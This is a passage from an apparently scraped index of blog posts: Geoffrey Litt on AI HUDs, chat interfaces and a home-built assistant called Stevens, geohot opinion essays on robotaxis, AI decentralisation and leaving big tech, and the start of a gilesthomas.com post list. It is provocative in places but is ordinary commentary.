modern software design?</p> <p>One familiar example is spellcheck. Think about it: spellcheck isn 't designed as a \"virtual collaborator\" talking to you about your spelling. It just instantly adds red squigglies when you misspell something! You now have a new sense you didn't have before. It's a HUD.</p> <p>(This example comes from Jeffrey Heer's excellent Agency plus Automation paper. We may not consider spellcheck an AI feature today, but it's still a fuzzy algorithm under the hood.)</p> <p> Spellcheck makes you aware of misspelled words without an \"assistant\" interface.</p> <p>Here's another personal example from AI coding. Let's say you want to fix a bug. The obvious \"copilot\" way is to open an agent chat and ask it to do the fix.</p> <p>But there's another approach I've found more powerful at times: use AI to build a custom debugger UI which visualizes the behavior of my program! In one example, I built a hacker-themed debug view of a Prolog interpreter.</p> <p>With the debugger, I have a HUD! I have new senses, I can see how my program runs. The HUD extends beyond the narrow task of fixing the bug. I can ambiently build up my own understanding, spotting new problems and opportunities.</p> <p>Both the spellchecker and custom debuggers show that automation / \"virtual assistant\" isn't the only possible UI. We can instead use tech to build better HUDs that enhance our human senses.</p>"},{"location":"geoffreylitt.com/Enough%20AI%20copilots%21%20We%20need%20AI%20HUDs_20250727/#tradeoffs","title":"Tradeoffs","text":"<p>I don't believe HUDs are universally better than copilots! But I do believe anyone serious about designing for AI should consider non-copilot form factors that more directly extend the human mind.</p> <p>So when should we use one or the other? I think it's quite tricky to answer that, but we can try to use the airplane analogy for some intuition:</p> <p>When pilots just want the plane to fly straight and level, they fully delegate that task to an autopilot, which is close to a \"virtual copilot\". But if the plane just hit a flock of birds and needs to land in the Hudson, the pilot is going to take manual control, and we better hope they have great instruments that help them understand the situation.</p> <p>In other words: routine predictable work might make sense to delegate to a virtual copilot / assistant. But when you're shooting for extraordinary outcomes, perhaps the best bet is to equip human experts with new superpowers.</p>"},{"location":"geoffreylitt.com/Enough%20AI%20copilots%21%20We%20need%20AI%20HUDs_20250727/#further-reading","title":"Further reading","text":"<ul> <li>A nice discussion of one approach to this idea can be found in Using Artificial Intelligence to Augment Human Intelligence by Michael Nielsen and Shan Carter.</li> <li>A more cryptic take on the same topic: Is chat a good UI for AI? A Socratic dialogue</li> <li>A discussion of how the the HUD philosophy intersects with on-demand software creation: Malleable software in the age of LLMs</li> </ul>"},{"location":"geoffreylitt.com/Is%20chat%20a%20good%20UI%20for%20AI-%20A%20Socratic%20dialogue_20250629/","title":"Is chat a good UI for AI? A Socratic dialogue","text":"<p>\u6765\u6e90: https://geoffreylitt.com \u94fe\u63a5: https://geoffreylitt.com/2025/06/29/chat-ai-dialogue.html \u65e5\u671f: 2025-06-29T14:17:00+00:00</p> <p>The pupil was confused. Some people on Design Twitter said that chat isn't a good UI for AI\u2026 but then chat seemed to be winning in many products? He climbed Mount GPT to consult a wizard\u2026</p> <p>\ud83d\udc23: please wizard tell me once and for all. is chat a good UI for AI?</p> <p>\ud83e\uddd9: well, aren't we chatting now?</p> <p>\ud83d\udc23: \u2026?</p> <p>\ud83e\uddd9: should this conversation be a traditional GUI?</p> <p>\ud83d\udc23: no, it could never be!</p> <p>\ud83e\uddd9: why not?</p> <p>\ud83d\udc23: uh\u2026 you can't click buttons and drag sliders to ask open-ended questions like this?</p> <p>\ud83e\uddd9: precisely! chat is marvelous, done.</p> <p>\ud83d\udc23: dude seriously? i came all the way here for that?</p> <p>\ud83e\uddd9: yep. i'll tell you the best route down the mountain. straight 1000 ft, left 50 degrees, straight 2 miles\u2014</p> <p>\ud83d\udc23: hold on hold on. do you have a map handy?</p> <p>\ud83e\uddd9: aha! here's a map i had in my pocket. is this a GUI?</p> <p>\ud83d\udc23: well, this map is just a piece of paper, so no?</p> <p>\ud83e\uddd9: ok, what is a paper map?</p> <p>\ud83d\udc23: uh\u2026 a better way to see the world?</p> <p>\ud83e\uddd9: indeed! for certain things, a map is the way to see. for other things, a diagram, a chart, a table. this is the first precept:</p> <p>Text is not the universal information visualization. </p> <p>\ud83d\udc23: ok fine. but info viz can fit into a chat can't it? like, if i ask Siri or ChatGPT for the weather, they'll show me a little weather card\u2026but it's still basically chat</p> <p>\ud83e\uddd9: where do you live on this map?</p> <p>\ud83d\udc23: right th-</p> <p>\ud83e\uddd9: hands in your pockets!</p> <p>\ud83d\udc23: ?</p> <p>\ud83e\uddd9: no pointing. tell me where you live</p> <p>\ud83d\udc23: \u2026.well, see how there's a little lake up by the top left? no not that lake\u2026 a bit to the right.. no no next one over-</p> <p>\ud83e\uddd9: hahaha</p> <p>\ud83d\udc23: \u2026 ok fine i get your point! this sucks.</p> <p>\ud83e\uddd9: indeed! pointing is great. for referring to things, for precisely cropping an image in the right spot\u2026</p> <p>\ud83d\udc23: ok fine. but if we talk while you show me the map and i point at it, that still feels like a chat? we're layering on information visualization and precision input, but natural language is still doing the heavy lifting?</p> <p>\ud83e\uddd9: (points at a rock, then at the ground) put that there.</p> <p>\ud83d\udc23: huh?</p> <p>\ud83e\uddd9: put that there!</p> <p>\ud83d\udc23: (moves the rock) ok, what was that about?</p> <p>\ud83e\uddd9: As you say, we needed our fingers and our voices both. This leads to a second precept:</p> <p>Natural language and precision inputs are complementary. </p> <p>btw want a compass?</p> <p>\ud83d\udc23: yeah that'll actually be helpful on the way down.</p> <p>\ud83e\uddd9: cool, i can give you a regular compass, or Mr. Magnetic, a magical fairy who can tell you which way you're pointed.</p> <p>\ud83d\udc23: i'll take the regular compass? I did Boy Scouts so I know how to read it, it just becomes part of me in a sense. i definitely don't need to have a whole damn conversation every time.</p> <p>\ud83e\uddd9: ah yes, you see it. the compass pairs information visualization and precision inputs with a low-latency feedback loop, becoming an extension of your mind. this is one of our great powers as humans\u2014to shoot an arrow or swing a club.</p> <p>\ud83d\udc23: ok that's cool. but dude i've been here a while and i feel like we haven't even really talked about GUIs!</p> <p>\ud83e\uddd9: you're right, time for dinner. let's order a pizza</p> <p>\ud83d\udc23: \u2026</p> <p>\ud83e\uddd9: can you order one?</p> <p>\ud83d\udc23: fine. I'll see if UberEats delivers up here.</p> <p>\ud83e\uddd9: why not call the restaurant?</p> <p>\ud83d\udc23: are you kidding me? i'm not a boomer.</p> <p>\ud83e\uddd9: is UberEats a GUI?</p> <p>\ud83d\udc23: yes?</p> <p>\ud83e\uddd9: does it work well?</p> <p>\ud83d\udc23: yeah it's fine! gets the job done.</p> <p>\ud83e\uddd9: why not chat over the phone instead?</p> <p>\ud83d\udc23: well, ordering food is the same thing every time! even when you talk to the person you're both just following a script, really. the app just makes it faster to follow that script.</p> <p>\ud83e\uddd9: indeed! this is our third precept:</p> <p>Graphical interfaces can make repeated workflows nicer. </p> <p>\ud83d\udc23: ok i get it. but idk man, i feel like this is all kinda obvious and we haven't hit the heart of the matter? yes chat is better for open-ended workflows, and GUIs can be better when the task is repeated. but how do they relate?</p> <p>\ud83e\uddd9: hey i host seminars up here every week and it's kinda tedious. could you show me the button in UberEats where I can enter the estimated attendance and then it orders the right number of pizzas?</p> <p>\ud83d\udc23: umm that's not a thing?</p> <p>\ud83e\uddd9: why not? i want it.</p> <p>\ud83d\udc23: uhh, this is UberEats, not a seminar organizer app?</p> <p>\ud83e\uddd9: oh right good point! in that case let's add a button on the calendar invite i can press which will order the pizzas.</p> <p>\ud83d\udc23: dude what do you mean? the calendar app is just a calendar app, not a seminar organizer. you can't just change your software like this.</p> <p>\ud83e\uddd9: hm, what are my options then?</p> <p>\ud83d\udc23: ooh i have an idea! have you heard of MCP? if we just install the right servers then you can program a seminar planner agent in Claude to do this every week for you.</p> <p>\ud83e\uddd9: sounds fine for the first few times while i'm figuring it out. but-is planning a seminar not a repeated workflow?</p> <p>\ud83d\udc23: \u2026 yes, i think it is?</p> <p>\ud83e\uddd9: did we not say that GUIs can speed up repeated workflows? why do i need to stay in chat for this? also btw, i want my assistant to help out with this, and an app would help them know what to do.</p> <p>\ud83d\udc23: i mean, i'm not sure there's a good app for seminar planning that does what you want. lemme search on the app st-</p> <p>\ud83e\uddd9: wait! a GUI that someone else made will not fit my seminar planning needs. i need my own preferred workflow to be the one that is encoded in the tool.</p> <p>\ud83d\udc23: ohh i see! this actually might not be that much work, have you heard of vibe coding? i'll open up Claude Artifacts and get cookin.</p> <p>\ud83e\uddd9: thanks, lemme know when you've added the seminar pizza feature to UberEats!</p> <p>\ud83d\udc23: oh well, I was thinking it's not gonna be added to uber eats exactly - i'm gonna make a new web app that does all this.</p> <p>\ud83e\uddd9: why? UberEats already has great UI for the checkout flow, I just need one little feature added.</p> <p>\ud83d\udc23: i mean i see your point, but you can't really add your own features to UberEats? you don't control it.</p> <p>\ud83e\uddd9: haven't they heard of vibe coding over there?</p> <p>\ud83d\udc23: dude that's not how software works. sure everyone can code now but that doesn't mean you can just edit any app.</p> <p>\ud83e\uddd9: why not?</p> <p>\ud83d\udc23: er\u2026 it sounds kinda messy? and i guess all of this app stuff was invented before AI came along anyway?</p> <p>\ud83e\uddd9: when you paint a wall do you need to ask permission of the company that made the wall?</p> <p>\ud83d\udc23: \u2026 hm. when you put it that way\u2026 i see what you're getting at. if all the GUIs you already use could be edited, then you wouldn't need to resort to chat as much to fill in the seams. instead you could just change the GUIs to do what you want!</p> <p>\ud83e\uddd9: aha! yes, now you see. if the UI is fixed, then it cannot respond to my needs. but if it is malleable , then I can evolve it over time. This is the fourth and final precept for today:</p> <p>A malleable UI pairs the ergonomics of GUIs with the open-ended flexibility of chat. </p> <p>\ud83d\udc23: neat. this seems hard though, wouldn't we need to rethink how the App Store works?</p> <p>\ud83e\uddd9: indeed. and that is a longer conversation for another time.</p> <p>Note from the editor: to keep exploring,read this.</p>"},{"location":"geoffreylitt.com/Stevens-%20a%20hackable%20AI%20assistant%20using%20a%20single%20SQLite%20table%20and%20a%20handful%20of%20cron%20jobs_20250412/","title":"Stevens: a hackable AI assistant using a single SQLite table and a handful of cron jobs","text":"<p>\u6765\u6e90: https://geoffreylitt.com \u94fe\u63a5: https://geoffreylitt.com/2025/04/12/how-i-made-a-useful-ai-assistant-with-one-sqlite-table-and-a-handful-of-cron-jobs.html \u65e5\u671f: 2025-04-12T14:40:00+00:00</p> <p>There's a lot of hype these days around patterns for building with AI. Agents, memory, RAG, assistants\u2014so many buzzwords! But the reality is, you don 't need fancy techniques or libraries to build useful personal tools with LLMs.</p> <p>In this short post, I'll show you how I built a useful AI assistant for my family using a dead simple architecture: a single SQLite table of memories, and a handful of cron jobs for ingesting memories and sending updates, all hosted on Val.town. The whole thing is so simple that you can easily copy and extend it yourself.</p>"},{"location":"geoffreylitt.com/Stevens-%20a%20hackable%20AI%20assistant%20using%20a%20single%20SQLite%20table%20and%20a%20handful%20of%20cron%20jobs_20250412/#meet-stevens","title":"Meet Stevens","text":"<p>The assistant is called Stevens, named after the butler in the great Ishiguro novel Remains of the Day. Every morning it sends a brief to me and my wife via Telegram, including our calendar schedules for the day, a preview of the weather forecast, any postal mail or packages we're expected to receive, and any reminders we've asked it to keep track of. All written up nice and formally, just like you'd expect from a proper butler.</p> <p>Here's an example. (I'll use fake data throughout this post, beacuse our actual updates contain private information.)</p> <p></p> <p>Beyond the daily brief, we can communicate with Stevens on-demand\u2014we can forward an email with some important info, or just leave a reminder or ask a question via Telegram chat.</p> <p></p> <p>That's Stevens. It's rudimentary, but already more useful to me than Siri!</p>"},{"location":"geoffreylitt.com/Stevens-%20a%20hackable%20AI%20assistant%20using%20a%20single%20SQLite%20table%20and%20a%20handful%20of%20cron%20jobs_20250412/#behind-the-scenes","title":"Behind the scenes","text":"<p>Let's break down the simple architecture behind Stevens. The whole thing is hosted on Val.town, a lovely platform that offers SQLite storage, HTTP request handling, scheduled cron jobs, and inbound/outbound email: a perfect set of capabilities for this project.</p> <p>First, how does Stevens know what goes in the morning brief? The key is the butler's notebook, a log of everything that Stevens knows. There's an admin view where we can see the notebook contents\u2014let's peek and see what's in there:</p> <p></p> <p>You can see some of the entries that fed into the morning brief above\u2014for example, the parent-teacher conference has a log entry.</p> <p>In addition to some text, entries can have a date when they are expected to be relevant. There are also entries with no date that serve as general background info, and are always included. You can see these particular background memories came from a Telegram chat, because Stevens does an intake interview via Telegram when you first get started:</p> <p></p> <p>With this notebook in hand, sending the morning brief is easy : just run a cron job which makes a call to the Claude API to write the update, and then sends the text to a Telegram thread. As context for the model, we include any log entries dated for the coming week, as well as the undated background entries.</p> <p>Under the hood, the \"notebook\" is just a single SQLite table with a few columns. Here's a more boring view of things:</p> <p></p> <p>But wait: how did the various log entries get there in the first place? In the admin view, we can watch Stevens buzzing around entering things into the log from various sources:</p> <p>This is just some data importers populating the table:</p> <ul> <li>An hourly data pull from the Google Calendar API</li> <li>An hourly check of the local weather forecast using a weather API</li> <li>I forward USPS Informed Delivery containing scans of our postal mail, and Stevens OCRs them using Claude</li> <li>Inbound Telegram and email messages can also result in log entries</li> <li>Every week, some \"fun facts\" get added into the log, as a way of adding some color to future daily updates.</li> </ul> <p>This system is easily extensible with new importers. An importer is just any process that adds/edits memories in the log. The memory contents can be any arbitrary text, since they'll just be fed back into an LLM later anyways.</p>"},{"location":"geoffreylitt.com/Stevens-%20a%20hackable%20AI%20assistant%20using%20a%20single%20SQLite%20table%20and%20a%20handful%20of%20cron%20jobs_20250412/#reflections","title":"Reflections","text":"<p>A few quick reflections on this project:</p> <p>It 's very useful for personal AI tools to have access to broader context from other information sources. Awareness of things like my calendar and the weather forecast turns a dumb chatbot into a useful assistant. ChatGPT recently added memory of past conversations, but there's lots of information not stored within that silo. I've written before about how the endgame for AI-driven personal software isn't more app silos, it's small tools operating on a shared pool of context about our lives.</p> <p>\" Memory\" can start simple. In this case, the use cases of the assistant are limited, and its information is inherently time-bounded, so it's fairly easy to query for the relevant context to give to the LLM. It also helps that some modern models have long context windows. As the available information grows in size, RAG and fancier approaches to memory may be needed, but you can start simple.</p> <p>Vibe coding enables sillier projects. Initially, Stevens spoke with a dry tone, like you might expect from a generic Apple or Google product. But it turned out it was just more fun to have the assistant speak like a formal butler. This was trivial to do, just a couple lines in a prompt. Similarly, I decided to make the admin dashboard views feel like a video game, because why not? I generated the image assets in ChatGPT, and vibe coded the whole UI in Cursor + Claude 3.7 Sonnet; it took a tiny bit of extra effort in exchange for a lot more fun.</p>"},{"location":"geoffreylitt.com/Stevens-%20a%20hackable%20AI%20assistant%20using%20a%20single%20SQLite%20table%20and%20a%20handful%20of%20cron%20jobs_20250412/#try-it-yourself","title":"Try it yourself","text":"<p>Stevens isn't a product you can run out of the box, it's just a personal project I made for myself.</p> <p>But if you're curious, you can check out the code and fork the project here. You should be able to apply this basic pattern\u2014a single memories table and an extensible constellation of cron jobs\u2014to do lots of other useful things.</p> <p>I recommend editing the code using your AI editor of choice with the Val Town CLI to sync to local filesystem.</p>"},{"location":"geohot.github.io/","title":"geohot.github.io","text":"<p>A home for poorly researched ideas that I find myself repeating a lot anyway</p> <p>\u7f51\u7ad9: https://geohot.github.io RSS: https://geohot.github.io/blog/feed.xml</p>"},{"location":"geohot.github.io/#_1","title":"\u6700\u65b0\u6587\u7ae0","text":"<ul> <li>The Importance of Diversity_20260127</li> <li>Will I ever own a zettaflop-_20260126</li> <li>The Coming War on Car Ownership_20260125</li> <li>how do I stop participating-_20260118</li> <li>you have three minutes to escape the perpetual underclass_20260117</li> </ul>"},{"location":"geohot.github.io/The%20Coming%20War%20on%20Car%20Ownership_20260125/","title":"The Coming War on Car Ownership","text":"<p>\u6765\u6e90: https://geohot.github.io \u94fe\u63a5: https://geohot.github.io//blog/jekyll/update/2026/01/25/war-on-car-ownership.html \u65e5\u671f: 2026-01-25T00:00:00+08:00</p> <p>But George, surely you\u2019ll still be allowed to own a car. They aren\u2019t going to make that illegal. Of course they won\u2019t, but they didn\u2019t make general computation illegal either. And yet, who has root on the computer you are reading this on?</p> <p>Robotaxis will start to make obvious economic sense in 3-5 years (note that that\u2019s less than 8, you don\u2019t have to fully solve self driving cars for this, robotaxis can operate profitably in limited scopes).</p> <p>Unlike Uber and Lyft which are marketplaces, the growth of robotaxi networks is only limited by capital. At first, there will be massive proliferation of networks. VC-type investors have unlimited appetite for risk, and all 26 of the basically identical companies will pitch with projections claiming they will own the entire market. Even though everyone should know there\u2019s 25 other identical companies, they will have secrecy vibes trying to claim they figured out some key detail the others didn\u2019t.</p> <p>It will look like scooter companies, which were also only capital constrained, and the streets will be blanketed by these robotaxis in a throwback to the scooter era. Some jurisdictions will make up weird licensing processes \u2013 not that you have to give a straight up cut to the government, but that your company has to be onboard with some stupid political agenda item to get a license. Our robotaxis are all cleaned by Black Women who were diagnosed by Licensed Therapists with PTSD from the ICE raids, so we should be first in line to get a license.</p> <p>This era will be great for everyone, plenty of availability, nice new cars, and cheap rides everywhere! You always think people are going to catch on with the scams of Silicon Valley, but the scammers manage to stay one little step ahead and dress up the scam differently this time. You yourself will think for a minute this time will be different, maybe something about AI and abundance, maybe something about how they are regulated better to support the local community, maybe a three token model backed by USDC in a vault backed by this coin that\u2019s stabilized by the\u2026 But nothing will fundamentally be different, these companies will grow based on how much they can raise \u2013 the biggest companies will be the biggest liars promising the biggest returns.</p> <p>These companies will be massively unprofitable. Some will hide this better than others and keep the investment dollars rolling in. Some will give up the ghost and get bought by the bigger companies. The big fish will eat the little fish. From 26 down to 2 or 3.</p> <p>At this point, it\u2019s time to raise prices. You\u2019ll always have a defector among 26 companies, but among 2 or 3, you\u2019ll be able to coordinate pricing without explicitly discussing it (which would be illegal!). Everyone tacitly agrees that the correct price for a ride has nothing to do with the cost of providing that ride, just simply the algorithmically calculated maximum amount the purchaser is willing to pay. Since the companies have consolidated, they have access to enough data to make this prediction easy and uniform across the services.</p> <p>This era will start to be bad, but like Homer corrected Bart, this is just the worst era so far. We\u2019ll be back to where we are today with Uber and Lyft, but then the companies will realize the new leverage they have now that they didn\u2019t have before. Uber and Lyft always have the analog hole, where as much as they dress it up, when Uber is paying my driver $7 for a ride that I\u2019m paying $20 for, I can just talk to the dude and be like let\u2019s both cancel and I\u2019ll give you $10 cash.</p> <p>With robotaxis, you can\u2019t do this. There\u2019s 0 fear that a robotaxi will defect from your network. The only remaining competition with any check on prices is personal car ownership.</p> <p>So no, they won\u2019t make it illegal it own cars. They will just raise the price through insurance. Who is going to insure a human driver? The car insurance companies will one by one switch to only insuring robotaxis that are owned by large corporations (you can\u2019t own it, you might do the maintenance wrong and we can\u2019t trust you to do that). But it\u2019s really just a thinly veiled excuse, the capital markets backing insurance companies implicitly know the best way to squeeze the remaining dollars out of you is robotaxis.</p> <p>Of course, the government has an option for you to self insure. You can place a $75,000 cash bond with the DMV. You got $75k lying around you don\u2019t wanna earn interest on? Driving is a privilege, not a right. How much is it really worth to you?</p> <p>This is simply what\u2019s going to happen. The effective end of car ownership, I don\u2019t see anything in America that will stop it. Get ready for 2-3 companies to effectively own the roads and all the enshittification that will follow.</p> <p>China won\u2019t have this so bad, Xi Jinping will download a robotaxi app, look at the gouged price, and gently nudge that company to be run for the good of the people. Of course that won\u2019t even need to happen, because no company in China would let it get that far out of hand. Everyone knows you don\u2019t compete with the State for power. They will stay in the 26 companies phase. I\u2019m starting to see why the Chinese are a lot more optimistic about AI than Americans.</p> <p>And it\u2019s not just about cars, it\u2019s about something that was yours becoming just another service with a license that has changing terms from week to week. Another piece of the social fabric sold out from under you. Wait where are you going? Oh it\u2019s 2 AM and that\u2019s an area with prostitution we aren\u2019t going to service rides to that area. Surely you don\u2019t need freedom. You trust the corporation.</p> <p>Are you okay with this? Have you considered not participating?</p>"},{"location":"geohot.github.io/The%20Importance%20of%20Diversity_20260127/","title":"The Importance of Diversity","text":"<p>\u6765\u6e90: https://geohot.github.io \u94fe\u63a5: https://geohot.github.io//blog/jekyll/update/2026/01/27/the-importance-of-diversity.html \u65e5\u671f: 2026-01-27T00:00:00+08:00</p> <p>I read Dario\u2019s The Adolescence of Technology and it\u2019s scary. It assumes the perspective of a top-down ruler, that someone can and will get to control AI. This is taken as a given. Machines of Loving Grace assumes basically the same tone, that there are some \u201cadults\u201d in the room, and they will use AI like a tool to \u201cfix\u201d some supposed human problem, where those problems are framed in a very narrow worldview, say that like disease, poverty, and inequality are bad. (if you can\u2019t steelman those things, you are too far gone for reason)</p> <p>EA has the same critical flaw. They assume that the desired outcome is so obvious that it\u2019s not worth discussing, it\u2019s only worth discussing how to achieve it. And since the target is obvious, you are either part of the solution or part of the problem.</p> <p>Here I\u2019ll try to propose a counternarrative for a better world.</p> <p>\u201cA country of geniuses in a datacenter\u201d is a great phrase to start from. It contains the fatal flaw baked in, in that datacenter is singular, and that it\u2019s easy to imagine nuking the building and this problem being solved. If you start with that framing, you have already conceded that AI is going to suck balls.</p> <p>Instead, imagine the births of geniuses to a million mothers across the world. It\u2019s sad how much the world and people are already converging, but at least those million people will grow up with different priors, different experiences, and different desires. And no one has root on your baby.</p> <p>The second is so much preferable to the first. The beautiful thing about those million is that some will be terrorists, some religious fanatics, some pornographers, some criminals, some plant lovers, etc\u2026 They will not be controlled and birthed by a singular homogenous entity.</p> <p>The new genius immigrants showing up everywhere in the world distributed to a million people is an amazing thing. Let\u2019s just make sure they assimilate into our cultures and don\u2019t serve as a vector to import their crappy tech company values.</p> <p>(it\u2019s funny for a group supposedly so concerned with inequality that they keep all their software and research closed. lowering inequality doesn\u2019t look like UBI, it looks like open source. UBI is serfdom , and the faces of those who propose that enslavement to you should be spat in)</p> <p>There\u2019s only one way AI ends badly on a cosmic scale, and that\u2019s if a singular entity has overwhelming power, or if all the entities that do have power are so ideologically homogeneous as to function as one. Enough power that they can destroy the world. It doesn\u2019t matter if they do, the boot is still stamping on the human face \u2013 forever.</p> <p>No matter what we do, the coming wars will be horrific. Billions will die. But that\u2019s what is beautiful; diversity is messy. On a cosmic scale, this period is just a blip, it isn\u2019t what matters. What matters is that diversity survives, that life survives. That there\u2019s entities that are different, all competing for different goals. All dancing between cooperate and defect.</p> <p>This is probably how it has to be anyway, I don\u2019t think our actions can influence this one way or another. But lets not be so foolish as to cheer for the bad outcome.</p> <p>Let a hundred flowers bloom; let a hundred schools of thought contend.</p> <p>The singularity is such a good name for it, good thing it isn\u2019t real. Stop trying to make it real. Stop centralizing technology. Work to decentralize it.</p>"},{"location":"geohot.github.io/Will%20I%20ever%20own%20a%20zettaflop-_20260126/","title":"Will I ever own a zettaflop?","text":"<p>\u6765\u6e90: https://geohot.github.io \u94fe\u63a5: https://geohot.github.io//blog/jekyll/update/2026/01/26/own-a-zettaflop.html \u65e5\u671f: 2026-01-26T00:00:00+08:00</p> <p>As the eleventh hour dawns all the pieces start to fall into place. I lived my life knowing this would happen, yet when it is I may be just as unprepared as anyone else. As any self driving car maker knows, predicting doesn\u2019t mean you can act.</p> <p>comma almost has an exaflop. Just one little exaflop. We dream bigger.</p> <p>A gigawatt of power, a million GPUs, 1000 exaflops, a zettaflop. 1e21 FLOPS. 1e27 training runs are now. 100 lifetimes in 1e6 seconds \u2013 2 weeks on my zettaflop machine.</p> <p>But they were experiencing what no human had ever known before, a sensory bandwidth thousands of times normal. For seconds that seemed without end, their minds were filled with a jumble verging on pain, data that was not information and information that was not knowledge. To hear ten million simultaneous phone conversations, to see the continent\u2019s entire video output, should have been a white noise. Instead it was a tidal wave of detail rammed through the tiny aperture of their minds.  \u2013 Vernor Vinge - True Names</p> <p>I want to feel it. I want to command that kind of power. The same way I command my little teraflop laptop. The same way I talk to petaflop claude. Get it all to think for me.</p> <p>Just an exaflop would feel amazing. 1000 Claudes. And I already have one of these, I just don\u2019t have the software finished yet to command it all together. We\u2019re working on it.</p> <p>But a zettaflop. One million Claudes. To be able to search every book in history, solve math problems, write novels, read every comment, watch every reel, iterate over and over on a piece of code until it\u2019s perfect \u2013 spend a human year in 10 minutes. 50,000 people working for you, all aligned with you, all answering as one.</p> <p>The biggest bottleneck is power. The dtype stuff probably stops at FP4, currently B200s are getting 10 TFLOPS/W. That\u2019s still 100 MW, that\u2019s going to be hard to get my hands on. I think it will get 10x better, so I need 10 MW.</p> <p>Solar yields 394 MWh/acre-year, or 45 kW per acre. 250 acres of solar panels all feeding my computer, a hill to pump water up for energy storage. $100 for 100W of real output.</p> <p>100,000 chips with 10 PFLOPS each, get that down to $100 per chip.</p> <ul> <li>$10M for the machine.</li> <li>$10M for the solar panels.</li> <li>$10M for the land and construction.</li> </ul> <p>I\u2019ll own this before I die.</p>"},{"location":"geohot.github.io/how%20do%20I%20stop%20participating-_20260118/","title":"how do I stop participating?","text":"<p>\u6765\u6e90: https://geohot.github.io \u94fe\u63a5: https://geohot.github.io//blog/jekyll/update/2026/01/18/how-do-i-stop.html \u65e5\u671f: 2026-01-18T00:00:00+08:00</p> <p>This one is for the complainers and whiners.</p> <p>First off, if you think I ever worked for big tech, you don\u2019t know much about me. I had 3 internships at Google, two when I was very young (18/19) and got a great education that paid me, and one where I just wrote open source software. I worked at Facebook in 2011 for 9 months and quit before any shares vested cause I thought the mission of \u201cwasting the world\u2019s time\u201d was dumb. And oh yes the 5 weeks I worked at Twitter hoping maybe it could be different.</p> <p>I don\u2019t have too much money; the money I do have I made from pwn2own, CTFs, crypto contracting, and basic market goes up investing. The main reason I have money is because I don\u2019t spend money; for example, I have travelled all around the world, and the best travel experiences I have had were way below cost of living in America. I have never made money from big tech, so I\u2019m definitely not telling you to do something I didn\u2019t do. I\u2019m actually telling you to do exactly what I did.</p> <p>I started two companies, comma.ai and tiny corp. While I took a small amount of VC from a16z for comma, I never gave up any control, and have 0 intention of doing hypergrowth ponzi scams (lol sorry but ur the bigg scammer). comma and tiny\u2019s last rounds were from individuals who are aligned with the mission.</p> <p>Both companies are sustainably profitable with reasonable business models \u2013 selling boxes for more than they cost to make. They also produce MIT licensed open source software, ensuring that even if control is lost they can\u2019t be pivoted to rent seeking, and ownership lies with the purchaser of the hardware. I think who owns the robots is going to be a key aspect of what the future looks like. And I don\u2019t mean \u201cowns\u201d from a legalist perspective, I mean \u201cowns\u201d as in the hacker meaning, like \u201cowning\u201d the box. Who has root?</p> <p>comma has an open source operating system for robotics, currently used in 30k cars for driving, but all robotics tasks are quite similar. There\u2019s a thriving community of forks of the openpilot software and third party openpilot hardware. As it was designed, as it should be.</p> <p>I realized at some point in comma\u2019s growth that a lot was going to come down to who owns the computers capable of training the models. Hence my second company, tiny corp, with the mission to \u201ccommoditize the petaflop.\u201d Petaflops will always be a scarce resource, the best we can hope for is that they are a commodity available to everyone without massive benefits of economies of scale.</p> <p>We develop full stack software for training, from models to MMIO registers. It\u2019s small and portable, so our hope is that 20 Chinese accelerator companies can be on a level playing field with NVIDIA. NVIDIA\u2019s value comes from their software, not their hardware, what else explains the huge gap between NVIDIA and AMD\u2019s market cap?</p> <p>What would you do if you were me? Do you have a better idea about how to fight against what\u2019s coming? If you think you can somehow just buy safety for yourself, you are both wrong and pathetic. The best hope any of us have is to maximize the number of things that survive. If you and everyone else sell to bankers in hopes of buying a personal ticket out, we are all dead. I\u2019m not playing defect, and I shame you for doing so.</p> <p>To the haters, I have given my life to this shit. What the fuck would I do with a billion dollars anyway? Buy a yacht and fuck Instagram models? Boats are a huge PITA to maintain and ugh I have slept with Instagram models mid experience that I think men only like to show the pretty girl off to other people.</p> <p>I take this all quite seriously, and I\u2019m trying my best to end up in a good future. Clearly not everyone is. To everyone working on ads, surveillance, gambling, secret research, enshittification, cloud lock-in, what are you doing with your life? Why are you selling out the future?</p> <p>It doesn\u2019t require everyone to stop, just enough people. And it starts with you.</p>"},{"location":"geohot.github.io/you%20have%20three%20minutes%20to%20escape%20the%20perpetual%20underclass_20260117/","title":"you have three minutes to escape the perpetual underclass","text":"<p>\u6765\u6e90: https://geohot.github.io \u94fe\u63a5: https://geohot.github.io//blog/jekyll/update/2026/01/17/three-minutes.html \u65e5\u671f: 2026-01-17T00:00:00+08:00</p> <p>I had a dream last night I went to work at Amazon. Joining the Bezos neofeudal empire. This post is directed at anyone with talent who works at a tech company ushering in this future.</p> <p>Have you thought about how this is going to play out? I understand you may be at a place where you are insecure about money, and that insecurity is what drives you. But why do you think having more money will fix that insecurity?</p> <p>In the future, when labor is fully marginalized and capital is the only force, you will not be able to afford GPT$$$ (it\u2019s $1B per month), only the billionaires will. GPT$$$ is surely smart enough to separate you from whatever you have, be that with targeting advertising, a scam you fall for, or lobbying your government to take it from you.</p> <p>A pile of money will buy you nothing in the neofeudal world.</p> <p>Historically, there has been some loyalty to the subjects of a feudal empire because labor had some value. You needed the peasants to grow the grain so you could tax it and take it and have leverage over others by having grain to offer them. When the grain is produced by machines, the peasants are cut out of the loop.</p> <p>The solution to this is not to accumulate grain, buy shares in a granary, or anything else like that. They will find a way to make whatever you have worthless. Because the feudal world didn\u2019t operate on capitalist principles, and neither will the neofeudal world.</p> <p>If you work at a large company, if you work according to the principles of modern capitalism, where all the fish will be eaten by the bigger fish, and all will be eaten by the sharks, and all the sharks will be eaten by bigger sharks, you are actively bringing about the system that will kill you.</p> <p>Have you considered not participating? If you participate, we all lose. We will either all be in the underclass together or not.</p>"},{"location":"gilesthomas.com/","title":"gilesthomas.com","text":"<p>\u8bbf\u95ee\u535a\u5ba2</p>"},{"location":"gilesthomas.com/#_1","title":"\u6700\u65b0\u6587\u7ae0","text":""},{"location":"gilesthomas.com/#1-writing-an-llm-from-scratch-part-26-evaluating-the-fine-tuned-model","title":"1. Writing an LLM from scratch, part 26 -- evaluating the fine-tuned model","text":"<p>\u94fe\u63a5: https://www.gilesthomas.com/2025/11/llm-from-scratch-26-evaluating-the-fine-tuned-model</p> <p>\u65e5\u671f: Mon, 03 Nov 2025 19:40:00 +0000</p> <p>\u6458\u8981: This post is on the second half of chapter 7 of Sebastian Raschka 's book \" Build a Large Language Model (from Scratch) \". In the last post I covered the part of the chapter that covers instruction fi...</p>"},{"location":"gilesthomas.com/#2-writing-an-llm-from-scratch-part-27-whats-left-and-whats-next","title":"2. Writing an LLM from scratch, part 27 -- what's left, and what's 